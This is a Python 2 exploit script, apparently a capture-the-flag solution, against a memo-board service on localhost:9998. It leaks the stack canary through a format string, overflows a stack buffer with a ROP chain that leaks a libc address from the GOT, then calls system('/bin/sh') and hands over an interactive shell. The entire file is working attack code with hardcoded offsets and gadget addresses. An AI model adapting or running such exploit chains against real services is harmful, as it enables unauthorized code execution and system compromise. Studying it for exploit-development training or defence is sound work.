import socket
import struct
import time
import binascii
import sys
import telnetlib

OFFSET = 312
NOP = '\x90'

# Leak Stack Cookie
COOKIE_FORMAT_STRING = "COOKIE [%7$p]"

# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
SYSTEM_OFFSET  = 0x045390
BINSH_OFFSET   = SYSTEM_OFFSET + 0x1479c7

# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fflush
FFLUSH_OFFSET  = 0x06d7a0

# ROPGadget on LIBC
POP_RDI_OFFSET = 0x021102

# objdump -R board | grep fflush
FLUSH_GOT = 0x601fe8

# From Disassembly
POP_RDI_RSI_RDX = 0x40076a
WRITE_PLT = 0x4005f0
CREATE_MEMO_ADDR = 0x400771

def readUntil(s, data):
	r = s.recv(len(data))
	
	while r != data:
		r = r[1:] + s.recv(1)

def asciiToHex(data):
	ret = ''
	while data:
		ret = chr(int(data[0:2], 16)) + ret
		data = data[2:]
	
	return ret

def getStackCookie():
	exploit = ''
	
	exploit += COOKIE_FORMAT_STRING
	
	exploit += '\nbody\n'
	return exploit

def getLIBCAddress(cookie):
	exploit = ''
	exploit += 'A' * OFFSET # Write malicious title
	
	# Include stack cookie
	exploit += cookie
	exploit += 'B' * 8
	
	# Leak address of LIBC
	exploit += struct.pack('<Q', POP_RDI_RSI_RDX)
	exploit += struct.pack('<Q', 0x1)
	exploit += struct.pack('<Q', FLUSH_GOT)
	exploit += struct.pack('<Q', 0x8)
	exploit += struct.pack('<Q', WRITE_PLT)
		
	exploit += struct.pack('<Q', CREATE_MEMO_ADDR) # Send control back to createMemo function
	exploit += struct.pack('<Q', CREATE_MEMO_ADDR) # Send control back to createMemo function
	
	exploit += '\nbody\n'	# Malicious body
	return exploit

def popShell(cookie, libc_base):
	exploit = ''
	exploit += 'A' * 262 # Offset is odd because we are doing some crazy recursive calls
	
	# Include stack cookie
	exploit += cookie
	exploit += 'B' * 8
	
	# Call system
	exploit += struct.pack('Q', POP_RDI_OFFSET + libc_base)
	exploit += struct.pack('Q', BINSH_OFFSET + libc_base)
	exploit += struct.pack('Q', SYSTEM_OFFSET + libc_base)
	
	exploit += struct.pack('<Q', CREATE_MEMO_ADDR)
	
	exploit += '\nbody\n'	# Malicious body
	return exploit

################################################################
#		Setup Connection
################################################################

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9998))

################################################################
#		Get Banner
################################################################

if not s.recv(1024):
	print '[-] No banner'
	sys.exit(0)
print '[+] Got banner'

################################################################
#		Leak Stack Cookie
################################################################

# Lets leak the stack cookie
s.send('1\n')
s.recv(1024)
print '[+] Selecting createMemo option'

# Submit format string exploit
s.send(getStackCookie())
s.recv(1024)

# Abuse format string to leak cookie
s.send('3\n-1\n')
time.sleep(0.25)
readUntil(s, 'COOKIE [0x')
cookie = s.recv(16)
s.recv(1024)

cookie = asciiToHex(cookie)
print '[+] Leaked stack cookie: 0x%s' % binascii.hexlify(cookie)

################################################################
# 		Delay a little
################################################################

# Not sure why we need this, but without it doesn't work
time.sleep(0.25)

################################################################
#		Leak LIBC Address
################################################################

# Send malicious option
s.send('1\n')
s.recv(1024)
print '[+] Selecting createMemo option'

s.send(getLIBCAddress(cookie) + '\n')
print '[*] Attempting to leak LIBC base address'

# Read 'Body: '
readUntil(s, 'Body: ')
data = s.recv(8)
s.recv(1024)

fflush_address = struct.unpack('<Q', data)[0]
libc_address   = fflush_address - FFLUSH_OFFSET
print '[+] Libc Base Address %s' % hex(libc_address)
print '[+] System Address: %s' % hex(libc_address + SYSTEM_OFFSET)

################################################################
# 		Delay a little
################################################################

# Not sure why we need this, but without it doesn't work
time.sleep(0.25)

################################################################
#		Pop a Shell
################################################################

# Get back to createMemo window
s.send('\n1\n')
s.recv(1024)

print '[*] Attempting to obtain shell'
s.send(popShell(cookie, libc_address) + '\n')

################################################################
#		Load Shell
################################################################

s.send('id; whoami; uname -a\n')
data = s.recv(1024)
if not data:
	print '[-] Error obtaining shell'
	sys.exit(0)

print '[+] Obtained shell'
print data,

t = telnetlib.Telnet()
t.sock = s
t.interact()
